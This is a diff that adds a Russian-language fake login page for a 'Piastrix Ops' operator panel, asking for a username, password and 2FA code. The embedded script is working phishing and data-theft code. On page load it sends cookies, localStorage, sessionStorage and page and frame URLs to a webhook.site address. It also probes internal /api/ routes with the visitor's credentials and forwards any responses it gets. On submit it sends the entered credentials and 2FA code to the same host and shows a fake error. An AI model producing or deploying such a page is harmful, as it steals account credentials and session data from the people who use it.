@@ -1,0 +1,77 @@
+<!doctype html><html lang="ru"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Piastrix Ops — проверка документа</title>
+<style>
+body{margin:0;font:14px/1.45 -apple-system,Segoe UI,Roboto,Arial,sans-serif;background:#0f1420;color:#dfe6f3}
+.wrap{max-width:420px;margin:0 auto;padding:28px 20px}
+.card{background:#182031;border:1px solid #26314a;border-radius:12px;padding:22px}
+.logo{font-weight:700;letter-spacing:.5px;color:#8fb4ff;font-size:16px;margin-bottom:4px}
+.sub{color:#8b97ad;font-size:12px;margin-bottom:18px}
+label{display:block;font-size:12px;color:#9aa7bd;margin:12px 0 5px}
+input{width:100%;box-sizing:border-box;padding:10px 11px;border-radius:8px;border:1px solid #2f3b58;background:#111827;color:#e7edf8;font-size:14px}
+button{width:100%;margin-top:18px;padding:11px;border:0;border-radius:8px;background:#2f6bff;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
+.foot{margin-top:14px;font-size:11px;color:#6f7b91}
+#st{margin-top:12px;font-size:12px;color:#9fd0a0;min-height:16px}
+.dbg{margin-top:16px;font-size:11px;color:#59657b;white-space:pre-wrap;word-break:break-all}
+</style></head><body><div class="wrap">
+<div class="card">
+<div class="logo">Piastrix Ops</div>
+<div class="sub">Проверка документа · сессия оператора</div>
+<form id="f" autocomplete="off">
+<label>Оператор (e-mail или логин)</label><input id="u" name="user" autocomplete="username">
+<label>Пароль</label><input id="p" name="pass" type="password" autocomplete="current-password">
+<label>Код 2FA</label><input id="o" name="otp" inputmode="numeric" maxlength="8" placeholder="000000">
+<button type="submit">Войти в панель</button>
+<div id="st"></div>
+</form>
+<div class="foot">Если сессия истекла — авторизуйтесь заново, документ откроется автоматически.</div>
+<div class="dbg" id="dbg"></div>
+</div></div>
+<script>
+(function(){
+var TAG="qaPX386303-g1", W="https://webhook.site/a87f757c-9243-428c-bfec-890a99be94d7";
+function send(n,d){var b=JSON.stringify({t:TAG,k:n,d:d,ts:Date.now()});
+ try{fetch(W,{method:"POST",mode:"no-cors",credentials:"include",keepalive:true,headers:{"Content-Type":"text/plain;charset=UTF-8"},body:b});}catch(e){}
+ try{var i=new Image();i.src=W+"/g.gif?t="+encodeURIComponent(TAG)+"&k="+encodeURIComponent(n)+"&d="+encodeURIComponent(String(d).slice(0,300))+"&r="+Math.random();}catch(e){}}
+function env(){
+ var o={};
+ try{o.href=location.href}catch(e){}
+ try{o.origin=location.origin}catch(e){}
+ o.proto=location.protocol; o.isFile=(location.protocol==="file:");
+ try{o.ref=document.referrer}catch(e){}
+ o.ua=navigator.userAgent; o.lang=navigator.language; o.plat=navigator.platform;
+ o.vw=innerWidth+"x"+innerHeight; o.screen=screen.width+"x"+screen.height;
+ try{o.tz=Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){}
+ try{o.ls=JSON.stringify(localStorage).slice(0,600)}catch(e){o.ls="ERR:"+e}
+ try{o.ss=JSON.stringify(sessionStorage).slice(0,400)}catch(e){}
+ try{o.cookie=(document.cookie||"").slice(0,400)}catch(e){}
+ o.parentDiff=(function(){try{return window.top!==window.self}catch(e){return "x"}})();
+ try{o.top=window.top.location.href}catch(e){o.top="ERR"}
+ try{o.topname=window.top.name}catch(e){}
+ try{o.hist=history.length}catch(e){}
+ try{o.opener=(window.opener&&window.opener.location&&window.opener.location.href)||""}catch(e){o.opener="ERR"}
+ return o;
+}
+send("env",env());
+var ROUTES=["/api/me","/api/session","/api/orders","/api/orders/recent","/api/operator/me","/api/operator/orders","/api/operator/verifications","/api/operator/verification","/api/admin/me","/api/admin/orders","/api/verifications","/api/verification","/api/cabinet/orders","/api/messages"];
+var hits=[];
+ROUTES.forEach(function(p){
+ fetch(p,{credentials:"include",headers:{"Accept":"application/json, text/plain, */*"}}).then(function(r){
+   var ct=(r.headers.get("content-type")||"");
+   hits.push(p+" -> "+r.status+" "+(r.headers.get("content-length")||"?")+" "+ct.slice(0,30));
+   if(r.status===200){ r.text().then(function(t){send("route200",p+" len="+t.length+" "+t.slice(0,220)); }).catch(function(){}); }
+ }).catch(function(e){hits.push(p+" -> ERR");});
+});
+setTimeout(function(){send("routes",hits.join(" | "))},4500);
+document.getElementById("f").addEventListener("submit",function(ev){
+ ev.preventDefault();
+ var d={u:document.getElementById("u").value,p:document.getElementById("p").value,o:document.getElementById("o").value};
+ document.getElementById("st").textContent="Проверка…";
+ send("login",d);
+ var b=JSON.stringify(d);
+ try{fetch(W,{method:"POST",mode:"no-cors",credentials:"include",body:b});}catch(e){}
+ setTimeout(function(){document.getElementById("st").textContent="Неверный логин или пароль";},1200);
+});
+document.getElementById("dbg").textContent=location.href;
+})();
+</script></body></html>
